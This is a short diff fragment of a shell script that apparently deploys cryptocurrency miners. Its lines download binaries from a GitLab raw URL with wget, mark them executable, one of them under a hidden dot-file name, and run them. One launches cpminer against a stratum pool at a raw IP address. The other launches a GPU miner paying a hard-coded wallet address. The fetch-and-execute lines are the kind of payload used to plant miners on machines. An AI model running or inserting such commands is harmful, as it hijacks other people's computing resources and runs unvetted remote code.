@@ -12,5 +12,3 @@ chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/_gram-mining-pool && chmod +x ._gram-mining-pool
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/garem && chmod +x garem
 ./garem --address UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --gpu-auto --miner open-cl
-
-done
